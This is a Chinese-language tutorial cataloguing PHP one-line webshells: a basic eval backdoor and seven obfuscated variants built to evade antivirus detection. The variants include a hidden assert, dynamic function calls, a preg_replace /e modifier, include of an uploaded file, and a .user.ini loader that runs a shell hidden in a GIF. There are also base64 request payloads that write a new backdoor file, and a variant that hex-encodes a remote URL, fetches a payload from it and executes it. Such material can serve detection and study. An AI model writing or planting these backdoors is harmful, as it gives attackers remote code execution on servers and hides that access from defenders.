# 常见php一句话webshell解析

> 我理解的 webshell 是在服务器上以 web server application \(比如apache,iis或者nginx\)的权限进行远程任意代码执行的工具。当然通过一些手段也可能可以进行提权。

## 最基础的 php webshell <a id="&#x6700;&#x57FA;&#x7840;&#x7684;-php-webshell"></a>

```php
	<?php eval($_POST[CMD]);?>
```

将 post 请求中的 CMD 参数直接执行。

```php
<?php eval($_GET[CMD]);?>
```

原理浅析：

1、在PHP脚本语言中，eval（code）的功能是将code组合成php指令，然后将指令执行。  
2、  
就相当于执行 echo phpinfo（）语句。

## 变形一 <a id="&#x53D8;&#x5F62;&#x4E00;"></a>

为了与各种静态分析检测的杀毒软件进行对抗，webshell的代码也在不断进行混淆和改进。

```php
	<?php $x=$_GET['z']; @eval("$x;");?>
```

一般的安全软件可能会将eval+GET或POST判定为后门程序，因此这种变形将eval和GET或者POST分开，能够绕过这种情况。

## 变形二 <a id="&#x53D8;&#x5F62;&#x4E8C;"></a>

接收方  
感觉这里并没有写对，应该是传入的两个参数都是base64加密的，经过解密后再执行，生成后门文件。

```php
<?php
$a=str_replace(x,"","axsxxsxexrxxt");$a($_POST["code"]);
?>
```

请求参数

```php
?code=fputs(fopen(base64_decode(J2MucGhwJw==),w),base64_decode("PD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg=="))
```

还原出的命令

```php
assert(fputs(fopen('c.php',w),"<?php@eval($_POST[a]);?>"))
```

利用assert来执行命令，并且用字符串隐藏assert方法，并且利用它加上动态传入参数的方式构造后门。

## 变形三 <a id="&#x53D8;&#x5F62;&#x4E09;"></a>

```php
<?php
$_GET['a']($_GET['b']);
?>
```

请求参数

```php
?a=assert&b=fputs(fopen(base64_decode(J2MucGhwJw==),w),base64_decode("PD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg=="))
```

完全利用动态参数传入的方式构造后门，将敏感函数和执行的命令动态传入，效果与变形二是一致的。

## 变形四 <a id="&#x53D8;&#x5F62;&#x56DB;"></a>

```php
($code = $_POST['code']) &&@preg_replace('/ad/e','@'.str_rot13('riny').'($code)', 'add')
```

改进的地方：  
首先，将eval函数用str\_rot13\(‘riny’\)隐藏。  
然后，利用 e 修饰符，在preg\_replace完成字符串替换后，使得引擎将结果字符串作为php代码使用eval方式进行评估并将返回值作为最终参与替换的字符串。

## 变形五 <a id="&#x53D8;&#x5F62;&#x4E94;"></a>

```php
$filename=$_GET['code']; include ($filename);
```

改进的地方：  
由于include方法可以直接编译任何格式的文件为php格式运行，因此可以上传一个txt格式的php文件，将真正的后门写在文本当中。

## 变形六 <a id="&#x53D8;&#x5F62;&#x516D;"></a>

```php
auto_prepend_file=code.gif
```

上传.user.ini，并且写入auto\_prepend\_file=code.gif  
将一句话隐藏在code.gif中，并且将它上传到同一目录下。

改进的地方：  
将一句话木马隐藏在图形文件中，并且利用用户配置文件将其自动加载到同目录的php文件下，使得所有正常php文件都毫不知情的中招。

## 变形七 <a id="&#x53D8;&#x5F62;&#x4E03;"></a>

```php
if(empty($_SESSION['api']))$_SESSION['api']=substr(file_get_contents(sprintf('%s?%s',pack("H*",'687474703a2f2f377368656c6c2e676f6f676c65636f64652e636f6d2f73766e2f6d616b652e6a7067'),uniqid())),3649);
@preg_replace("~(.*)~ies",gzuncompress($_SESSION['api']),null);
```

改进的地方：  
第一，通过pack函数得到URL  
第二，利用file\_get\_contents获得make.jpg。  
第三，利用substr截取3649字节以后的内容。  
第四，利用gzuncompress方法将3649字节以后的内容解压出来。  
第五，用preg\_replace方法的e操作符将代码执行。  
还有很多后续操作……

## 后记 <a id="&#x540E;&#x8BB0;"></a>

以上为了试验操作的方便，采用的是Get方式获取PHP的执行代码，但实际上，由于URL长度的限制，一般采用Post的方式。由于PHP版本的不断更新，因此一些旧的方法可能已经不太好用，但是随着版本的更新，相信也会有更多越来越新奇的mm慢慢浮出水面，让我们拭目以待。

另外除了这些一句话以外，还有一些不错的大马，例如rc-shell等，以及github上大量的webshell仓库。

## 参考资料 <a id="&#x53C2;&#x8003;&#x8D44;&#x6599;"></a>

\[1\] [一句话木马初级篇：常见PHP后门解析 - ArkTeam](https://blkstone.github.io/2016/07/21/php-webshell/一句话木马初级篇：常见PHP后门解析)  
\[2\] [一款功能强大的Web shell工具RC-SHELL](http://bobao.360.cn/news/detail/3310.html)  
\[3\] [github webshell](https://github.com/tennc/webshell)

